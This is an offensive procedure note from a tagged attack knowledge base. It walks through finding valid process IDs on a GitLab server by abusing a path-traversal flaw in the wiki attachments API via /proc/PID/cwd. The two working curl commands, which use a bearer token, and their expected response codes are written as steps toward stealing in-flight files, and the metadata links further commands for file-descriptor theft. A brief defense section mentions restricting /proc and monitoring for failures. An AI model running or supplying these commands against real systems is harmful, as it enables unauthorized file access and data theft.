---
tags:
  - proc-fs
  - pid-discovery
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/echo]]'
  - '[[tools/sudo]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/create-test-file-git-owned]]'
  - '[[commands/curl-nuget-upload-bypass]]'
  - '[[commands/create-test-file-root-owned]]'
  - '[[commands/curl-wiki-attachments-read]]'
  - '[[commands/curl-pid-validation-19601]]'
  - '[[commands/curl-pid-validation-19603]]'
  - '[[commands/loop-steal-inflight-files]]'
  - '[[commands/create-test-file-hello]]'
  - '[[commands/create-dummy-file-unused]]'
  - '[[commands/curl-group-import-pid-leak]]'
  - '[[commands/loop-probe-file-descriptors]]'
platforms:
  - Linux
techniques:
  - '[[File and Directory Discovery]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: a0e4a5d3-00b2-4eae-93f7-e54c8113faf9
created_at: '2025-12-11T06:10:15.418Z'
updated_at: '2025-12-11T06:10:15.418Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0007]]'
mitre_techniques:
  - '[[T1083]]'
---
# Discover Valid PID via Proc Filesystem Probing

## Summary

This procedure probes potential PIDs using /proc filesystem to identify valid ones for further file theft.

## Description

By attempting path traversal via /proc/PID/cwd and checking HTTP responses, attackers can loop over PIDs to find those with readable paths, enabling targeted exploits.

## Requirements

1. Known PID range to probe.
2. Access to wiki attachments API.
3. Dummy upload file.

## Defense

Defensive measures and detection strategies:

- Restrict /proc access in containers.
- Monitor repeated API failures for PID guessing.

## Objectives

1. Identify valid GitLab process PIDs.
2. Validate readability via response codes.
3. Prepare for FD theft.

## Instructions

### Step 1: Probe PID 19601

**Context**: Check HTTP code for invalid PID.

**Command** ([[commands/curl-pid-validation-19601]]):
```bash
curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19601/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'
```

> Expects 500 for invalid.

### Step 2: Probe PID 19603

**Context**: Check for valid PID.

**Command** ([[commands/curl-pid-validation-19603]]):
```bash
curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'
```

> Expects 201 for valid.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[File and Directory Discovery]]

### Sub-Techniques



## Commands Used

- [[commands/curl-pid-validation-19601]]
- [[commands/curl-pid-validation-19603]]

## Tools Used

- [[tools/curl]]

## Tags

- [[proc-fs]]
- [[pid-discovery]]
